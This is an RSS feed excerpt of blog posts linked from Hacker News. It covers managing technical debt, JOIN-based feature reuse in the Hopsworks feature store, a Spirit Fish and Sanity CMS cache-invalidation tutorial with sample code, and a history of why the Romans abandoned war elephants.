<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://labcodes.com.br/blog/articles/tech-debt.html">https://labcodes.com.br/blog/articles/tech-debt.html</a></em></p>]]>
            </description>
            <link>https://labcodes.com.br/blog/articles/tech-debt.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871348</guid>
            <pubDate>Fri, 23 Oct 2020 16:44:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Feature Store for MLOps? Feature Reuse Means Join]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24870916">thread link</a>) | @moritzmeister
<br/>
October 23, 2020 | https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR; Many engineers conflate operational Feature Stores with key-value (KV) stores, like DynamoDB and Cassandra. In fact, KV stores are missing a key mechanism needed to make features reusable: JOINs. JOINs enable features to be reused by different models. This blog is about how to scale your ML infrastructure by reusing cached features so that the number of feature pipelines you manage does not grow linearly with the number of models you run in production.</p><figure id="w-node-6837f843508c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92f4e94a9b1084ab992187_twitter.jpg" loading="lazy" alt=""></p><figcaption><a href="https://odsc.com/speakers/from-silos-to-platform-building-twitters-feature-marketplace/">Img from OSDC talk by Twitter</a>. Twitter evaluate their Feature Store by the number of features that are reused across teams.</figcaption></figure><h2>The Cost of No JOINs: One Feature Pipeline per Model</h2><p>If you don’t reuse features across different models, you will need a new feature pipeline for every new model you put in production. In the diagram below, there is a 1:1 mapping between train/test datasets and models. For every new model you put in production, you will write a new feature pipeline from your data stores that transforms and validates the raw data and performs aggregations, materializing train/test data to files. A ML training program (or pipeline) then trains and validates a model with the train/test data, after which it is tested and deployed to production.</p><p>It is very difficult to reuse the features in the materialized train/test datasets, as they tend to be stored in a format specific to a ML framework: .tfrecord for TensorFlow,.npy for PyTorch - and they cannot be easily combined with features stored in other train/test datasets. This is often due to the limitations of the file formats: neither TFRecord nor NPY support projections (selecting just a subset of columns).</p><p>If you intend to run hundreds of models in production, running hundreds of pipelines will explode your technical debt.</p><figure id="w-node-5b746662ee67-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92ea783652dae4e198dca1_pic-01re.jpg" loading="lazy" alt=""></p></figure><p>In online feature stores that do not support JOINs, it is typically the responsibility of the application to perform the JOIN of the cached features to create the feature vector. So, if you build your own online feature store using Cassandra or DynamoDB, you will need to also add logic for joining (and ordering) features in your applications/models.&nbsp;</p><p>Every new feature you add to that model will need an update to the feature pipeline and changes to the application logic - making it costly and potentially cross-team work.</p><figure id="w-node-0abcd444357c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eaa4cc8f44bbcc4cb4ad_pic-02re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs enable Feature Reuse</h2><figure id="w-node-792e5aca9095-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eac165896f1612cb3dea_pic-03re.jpg" loading="lazy" alt=""></p></figure><p>A JOIN is a Structured Query Language (SQL) command to combine data from two different two database tables. JOINs are used to create a view over the data that originates from one or more tables. If we assume that we store features normalized in database tables, then we are able to create sets of features (training datasets) by selecting different features from different tables and joining them together using a common join key. The join key(s) identify the common entity these feature values represent.&nbsp;</p><p>If we now assume that features are stored as columns in tables, then what is a train/test dataset? It is a set of features along with a target column. Assuming the features are already present in existing tables, we can just join those features (columns) together to create a view - this view is the train/test dataset. The order of features (in a view) that makes up a train/test dataset is significant - a train/test dataset is a <a href="https://www.mathsisfun.com/combinatorics/combinations-permutations.html">permutations of features - not a combination</a>. Views (enabled by JOINs) enable a massive number of train/test datasets to be defined over a small number of shared features (stored in tables)</p><p>In Hopsworks, we store features in tables that we call “Feature Groups”. Feature Groups introduce a level of indirection between the raw input data and the train/test datasets used to train models, see below. They store a cached copy of the features, computed using the same feature pipeline from earlier, but this time, the feature pipeline writes to one or both of the stores that much a feature store: (1) a scalable store for train/test features (offline feature store) and (2) a low latency, high throughput store for features for serving (online feature store).&nbsp;</p><p>In Hopsworks, we use Apache Hive as a scalable database for the offline store, and MySQL Cluster (NDB) as the online store. Our version of Hive stores its metadata in NDB and its data files in HopsFS/S3. In Hopsworks, FeatureGroups are database tables in Hive and MySQL Cluster, along with feature metadata (also tables in the same NDB database).&nbsp;</p><p>As we can see in the diagram below, if we have N features available in the Feature Store, we can create an unlimited number of train/test datasets by simply joining features together from the offline feature store.&nbsp;</p><p>In Hopsworks, we use Spark, with its cost-based optimizer, to perform JOINs. Spark, together with Parquet/Hudi/ORC help optimize joins by supporting partitioned data, push-down projections, SortMergeJoin, and&nbsp;<br></p><ul role="list"><li>a hint;</li><li>a join type (inner, left, outer, etc);</li><li>a join condition (equi-join);</li><li>an estimation of the input data size</li></ul><figure id="w-node-d713661f3233-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eae8333d716893ac2f5a_pic-04re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs in Online Feature Stores</h2><p>If you use a KV store as your online store, you are back in the same situation as at start - you need a feature pipeline for every new model you put in production. But with Feature Groups (tables in NDB), we can materialize feature vectors (the individual row of features that is fed directly to the model for scoring) from the different tables by performing a join.</p><p>NDB supports <a href="http://mikaelronstrom.blogspot.com/2020/10/parallel-execution-of-outersemi-joins.html">sophisticated optimizations</a> for JOINs, and can push-down many JOINs to the database nodes. In practice, in NDB even complex queries can <a href="http://mikaelronstrom.blogspot.com/2020/10/dbt2-benchmarks-with-ndb-cluster.html">“achieve latency down to 5-10 ms for a transaction that contains around 30 SQL statements”</a>.</p><figure id="w-node-0a1416f8ba8d-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eb0ef0105a291dd69266_pic-05re.jpg" loading="lazy" alt=""></p></figure><h2>Conclusions</h2><p>Reuse features to save on infrastructure and the number of feature pipelines needed to maintain models in production. JOINs is the method we use in Hopsworks to reuse cached features across different models - both for training and serving. We use Spark as the JOIN engine for the offline feature store and NDB with its parallelized, push-down JOINs for low-latency joins in the online feature store. <br></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870916</guid>
            <pubDate>Fri, 23 Oct 2020 16:03:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Powering JavaScript Sites with Sanity CMS and Spirit Fish]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24870668">thread link</a>) | @_hhff
<br/>
October 23, 2020 | https://www.spirit.fish/blog/working-with-sanity | <a href="https://web.archive.org/web/*/https://www.spirit.fish/blog/working-with-sanity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

  <div>
    <p>Iâ€™ve said it a few times, but 
      <a target="_blank" href="https://www.sanity.io/">Sanity CMS</a>
 is easily the most futuristic content management system on the planet - with slick editor experience, unique deployable infrastructure, and the introduction of itâ€™s new 
      <a target="_blank" href="https://www.sanity.io/blog/introducing-presence">Presence</a>
 functionality, personally weâ€™d never use anything else!</p>

<p>So, itâ€™s only natural Spirit Fish would integrate nicely. Hereâ€™s a few of the ways we work with Sanity:</p>

<h2><strong>1. Rendering Sanity content for great SEO, Google Lighthouse Scores, and low FMP</strong></h2>

<p>Sanity is a headless CMS, so that means that in order to display data to end users, content needs to be loaded over HTTP. While thereâ€™s a bunch of framework dependent approaches to this, we prefer to load the data in the same javascript bundle that powers our React.js projects. </p>

<p>Hereâ€™s a trivial example using 
      <a target="_blank" href="https://reactjs.org/docs/create-a-new-react-app.html">create-react-app</a>
:</p>

<pre><code>
import React from "react";
import SanityClient from "@sanity/client";

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const query = `*[_type == "movie"] {
  _id,
  title
}[0...50]`;

function App() {
  const [movies, setMovies] = useState(null);

  useEffect(async () =&gt; {
    setMovies(await sanity.fetch(query));
  }, []);

  return (
    &lt;ul&gt;
      {movies.map(movie =&gt; (
        &lt;li key={movie._id}&gt;
          {movie.title}
        &lt;/li&gt;
      ))}
    &lt;/ul&gt;
  );
};

export default App;

</code></pre>

<p>If you deploy a create-react-app to a host like an S3 bucket, etc - when you view-source, youâ€™ll notice that your movies arenâ€™t there. Thatâ€™s because that content is loaded at the runtime! When Googleâ€™s crawler indexes your site, it will only see a blank page, and all of your end users wonâ€™t see any content until theyâ€™ve downloaded your javascript, and THEN loaded the Sanity query. Thatâ€™s no good for SEO, or conversions.</p>

<p>Of course, this is our bread and butter: create a Spirit Fish renderer, point it at that S3 bucket, and point your DNS at our CDN. Refresh your site, and boom! Your site is now rendered on the fly.</p>

<p>We find that adding a Spirit Fish renderer to a site usually doubles your 
      <a target="_blank" href="https://developers.google.com/web/tools/lighthouse">Google Lighthouse</a>
 scores, so thatâ€™s a big win for 5 minutes of setup!</p>

<h2><strong>2. Purging the entire Spirit Fish cache when content changes in Sanity</strong></h2>

<p>On first request - our renders take a few seconds - so we cache the result in a global CDN so that your rendered site is close to your users. </p>

<p>Got it! But what if my content changes?</p>

<p>Well - youâ€™ll need to trigger an invalidation in Spirit Fish. The easiest way to do this for small sites is to trigger a full invalidation. This will force your site to be re-rendered the next time your users visit, meaning your new data will be pulled from Sanity!</p>


<p>Thatâ€™s what we built our invalidations API for. Hereâ€™s what your `invalidate_all` endpoint looks like:</p>

<pre>  <code>
https://www.spirit.fish/api/v1/renderers/$RENDERER_ID/invalidate_all?api_key=$RENDERER_API_TOKEN
  </code>
</pre>

<p>This endpoint takes a `POST` request, so you can easily add it directly to Sanityâ€™s management portal, no code required:</p>

<a href="https://www.sanity.io/docs/webhooks" target="_blank">
  <p><img src="https://www.spirit.fish/assets/blog_posts/sanity_logo_square-7b9b2a49f4583770b16f9e4898285e61afa005dd41fa9e93e2e89b8d5b446cb1.jpg">
  </p>
  <div>
    <div>
      <p>Sanity - How to use Webhooks</p>
      <p>https://www.sanity.io/docs/webhooks</p>
    </div>
  </div>
</a>

<p>Now, whenever an editor updates content in Sanity, it will clear your Spirit Fish cache, easy as that!</p>

<h2><strong>3. Purging specific Spirit Fish pages when Sanity content changes with a serverless function</strong></h2>

<p>For small projects with a handful of pages, the above is probably fine - but when you have a large project (say an editorial with hundreds of pages), you wouldnâ€™t want to purge the entire Spirit Fish if only one page has changed.</p>

<p>In cases like this, youâ€™ll need your own backend endpoint to manage cache invalidations. We like serverless functions for this:</p>

<pre><code>
import SanityClient from '@sanity/client';
import handleError from 'utils/services/handleError';
import notEmpty from 'utils/notEmpty';

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const buildCacheClearPathForRecord = (record) =&gt; {
  switch (record._type) {
    case 'movie':
      return `/movies/${record.slug}`;
    case 'director':
      return `/directors/${record.slug}`;
  }
};

export default async (request, response) =&gt; {
  try {
    const records =
      await SanityClient.getDocuments(request.body.ids.all);
    const pages =
      records.filter(notEmpty).map(buildCacheClearPathForRecord);

    await fetch(`https://www.spirit.fish/api/v1/renderers/${process.env.RENDERER_ID}/api_invalidations`, {
      method: 'post',
      body: JSON.stringify({
        invalidation: { pages }
      }),
      headers: {
        'X-Hatchery-Renderer-Api-Key': process.env.RENDERER_API_KEY,
        'Content-Type': 'application/json'
      }
    });
    return response.end();
  } catch (e) {
    return handleError(request, response, e);
  }
};

</code></pre>

<p>Deploy your serverless function (we like 
      <a target="_blank" href="https://firebase.google.com/">Firebase</a>
 or 
      <a target="_blank" href="https://vercel.com/">Vercel</a>
), and setup your Sanity webhook (like we did above - don't forget the enviornment variables!) to hit this endpoint instead. Bingo! Youâ€™re now invalidating individual pages as content changes; eliminating the need for site wide rerenders, and keeping your content in cache for as long as possible.</p>



    <p>Spirit Fish is free to try, and each renderer comes with a generous free tier that should cover most hobby projects. 
      <a href="https://www.spirit.fish/auth/github">Sign up with Github over here.</a>
</p>
  </div>
</div></div>]]>
            </description>
            <link>https://www.spirit.fish/blog/working-with-sanity</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870668</guid>
            <pubDate>Fri, 23 Oct 2020 15:41:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[War Elephants, Part II: Elephants Against Wolves (2019)]]>
            </title>
            <description>
<![CDATA[
Score 125 | Comments 48 (<a href="https://news.ycombinator.com/item?id=24870626">thread link</a>) | @plat12
<br/>
October 23, 2020 | https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>



<figure><img data-attachment-id="639" data-permalink="https://acoup.blog/300-elephants/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png" data-orig-size="1353,806" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="300-elephants" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png" alt=""><figcaption>From 300.  I missed this last time, but I just want to note <strong>everything</strong> is wrong with this.  Let me count the ways:<br>1) These elephants are <strong>way</strong> too big.<br>2) The towers on their backs won’t be invented for more than a century<br>3) The bit-and-bridle system of control is not how elephants are controlled.<br>4) The weapons for the tusks are also wrong.<br>5) <strong>Xerxes didn’t have any elephants in his army</strong> (not even in the fantasy count that Herodotus gives)<br>6) This is not how you fight elephants and will get everyone stepped on.<br>One of these days, we’re going to talk about this movie and Sparta.  Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>



<figure><img data-attachment-id="640" data-permalink="https://acoup.blog/g3446/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg" data-orig-size="1186,1172" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="g3446" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg" alt=""><figcaption>Roman denarius (a coin) issued by Julius Caesar to commemorate the Battle of Thapsus (46 B.C.)</figcaption></figure>



<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>



